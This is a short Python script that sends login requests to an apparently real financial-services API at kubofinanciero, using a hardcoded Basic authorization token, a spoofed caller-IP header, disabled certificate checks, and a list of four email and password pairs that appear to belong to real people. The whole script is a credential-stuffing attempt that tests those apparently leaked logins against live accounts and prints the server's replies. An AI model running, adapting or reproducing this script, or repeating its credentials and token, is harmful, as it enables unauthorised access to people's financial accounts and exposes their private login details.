import requests, urllib3, sys, json
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://www.api.kubofinanciero.cloud'
BASIC = 'aW50ZXJuYWwtdXNlci5hcHBzLmt1Ym9maW5hbmNpZXJvLmNvbTo4MDM2ZDliYTBlZTAwODkwNGIzODJjNDQ2N2YzNDVkNTExZTE4YjE3YTk4ZGRlYjExMDc3MGQ0MWUyMGYxYjFk'
GEO = '-99.17885920237521;19.363957498510498'

creds = [
    ('mifelnet@gmail.com', 'Aloverg4$11'),
    ('coordinador.credito@asva.mx', 'Asva2835'),
    ('zatanasmx@outlook.com', 'Alexis01'),
    ('godoygiledgar@gmail.com', 'Alexis01'),
]

for u, p in creds:
    try:
        r = requests.post(BASE + '/security/login', headers={
            'Authorization': 'Basic ' + BASIC, 'Content-Type': 'application/x-www-form-urlencoded',
            'Geo-Position': GEO, 'X-Caller-Ip': '201.141.0.1'
        }, data=f'grant_type=password&username={u}&password={p}', verify=False, timeout=15)
        print(f'  {u}: [{r.status_code}] {r.text[:150]}')
    except Exception as e:
        print(f'  {u}: ERROR {str(e)[:100]}')
